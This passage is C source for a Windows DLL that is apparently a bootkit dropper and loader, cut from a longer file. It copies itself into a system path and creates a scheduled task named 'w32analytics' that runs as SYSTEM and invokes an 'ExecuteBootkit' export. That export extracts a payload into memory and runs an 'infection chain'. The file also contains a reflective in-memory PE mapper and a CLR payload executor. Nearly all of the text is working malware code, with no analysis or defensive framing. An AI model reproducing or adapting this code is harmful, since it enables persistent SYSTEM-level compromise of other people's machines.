    if (FileExists(SystemPath) || CopyFileA(CurrentPath, SystemPath, FALSE)) {
        system("schtasks /delete /tn w32analytics /f");
        system("schtasks /create /tn w32analytics /sc ONCE /st 07:00 /ru SYSTEM /tr \"rundll32 w32analytics.dll,ExecuteBootkit\"");
    }
}

__declspec(dllexport) BOOL ExecuteBootkit(VOID)
{
    g_CurrentModule = GetModuleHandle(NULL);

    InitializeCrc32Table();

    ExtractPayloadToMemory();
    ExecuteInfectionChain();

    if (g_PayloadData) {
        free(g_PayloadData);
        g_PayloadData = NULL;
    }

    return TRUE;
}

__declspec(dllexport) BOOL ExecuteClrLoader(PUCHAR AssemblyData, ULONG AssemblySize)
{
    return SUCCEEDED(ExecuteClrPayload(AssemblyData, AssemblySize, NULL, 0));
}

static ULONG_PTR ExecuteExportedFunction(PVOID MappedBase, PVOID Parameter)
{
    PIMAGE_DOS_HEADER DosHeader = (PIMAGE_DOS_HEADER)MappedBase;
    PIMAGE_NT_HEADERS NtHeaders = (PIMAGE_NT_HEADERS)((ULONG_PTR)MappedBase + DosHeader->e_lfanew);
    ULONG EntryPointRVA = NtHeaders->OptionalHeader.AddressOfEntryPoint;

    if (!EntryPointRVA) {
        return 0;
    }

    typedef ULONG_PTR (WINAPI *PFN_ENTRY_POINT)(PVOID MappedBase, ULONG Reason, PVOID Parameter);
    PFN_ENTRY_POINT EntryPoint = (PFN_ENTRY_POINT)((ULONG_PTR)MappedBase + EntryPointRVA);

    return EntryPoint(MappedBase, DLL_PROCESS_ATTACH, Parameter);
}

static ULONG_PTR NativeLoaderHandler(PUCHAR PayloadData, ULONG PayloadSize, LPCSTR CommandLine, ULONG CommandLineLength)
{
    RESOLVED_KERNEL_APIS ApiTable = {0};

    if (!ResolveKernelApis(&ApiTable)) {
        return 0;
    }

    PVOID MappedBase = MapImageFromMemory(GetCurrentImageBase(), &ApiTable);

    if (!MappedBase) {
        return 0;
    }

    HRESULT hr = ExecuteClrPayload(PayloadData, PayloadSize, CommandLine, CommandLineLength);

    return SUCCEEDED(hr) ? 1 : 0;
}

static ULONG_PTR DispatchHandler(PVOID Context, ULONG Reason, PULONG Parameters)
{
    if (Reason != 6) {
        return 1;
    }

    PUCHAR PayloadData = (PUCHAR)((ULONG_PTR)Parameters[0] + (LONG_PTR)Parameters);
    ULONG PayloadSize = Parameters[1];
    LPCSTR CommandLine = (LPCSTR)((ULONG_PTR)Parameters[2] + (LONG_PTR)Parameters);
    ULONG CommandLineLength = Parameters[3];

    return NativeLoaderHandler(PayloadData, PayloadSize, CommandLine, CommandLineLength);
}

static VOID RuntimeLockAcquire(VOID)
{
    LONG Expected;
    do {
        while ((Expected = g_RuntimeLock) != 0) {
            Sleep(1000);
        }
    } while (InterlockedCompareExchange(&g_RuntimeLock, 1, 0) != 0);
}

static VOID RuntimeLockRelease(VOID)
{
    InterlockedExchange(&g_RuntimeLock, 0);
}

static int RuntimeInitialize(PVOID Context, int Reason)
{
    if (Reason == 0) {
        if (g_RuntimeRefCount < 1) {
            return 0;
        }
        g_RuntimeRefCount--;

        RuntimeLockAcquire();
        if (g_RuntimeState == 2) {
            g_RuntimeState = 0;
        } else {
            _amsg_exit(0x1F);
        }
        RuntimeLockRelease();

    } else if (Reason == 1) {
        uint64_t ThreadId = (uint64_t)GetCurrentThreadId();

        LONG LockOwner;
        RuntimeLockAcquire();
        LockOwner = g_RuntimeLock;
        g_RuntimeLock = (LONG)ThreadId;
        RuntimeLockRelease();

        if (LockOwner != 0 && (uint64_t)LockOwner != ThreadId) {
            Sleep(1000);
        }

        if (g_RuntimeState == 1) {
            _amsg_exit(0x1F);
        } else if (g_RuntimeState == 0) {
            g_RuntimeState = 1;
        }

        if (g_RuntimeState == 1) {
            g_RuntimeState = 2;
        }

        if ((uint64_t)LockOwner != ThreadId) {
            RuntimeLockAcquire();
            g_RuntimeLock = 0;
            RuntimeLockRelease();
        }

        g_RuntimeRefCount++;
        return 1;
    }
    return 1;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{
    switch (fdwReason) {
        case DLL_PROCESS_ATTACH:
            DisableThreadLibraryCalls(hinstDLL);
            g_CurrentModule = hinstDLL;
            RuntimeInitialize(NULL, 1);
            break;

        case DLL_PROCESS_DETACH:
            RuntimeInitialize(NULL, 0);
            break;
    }
    return TRUE;
}
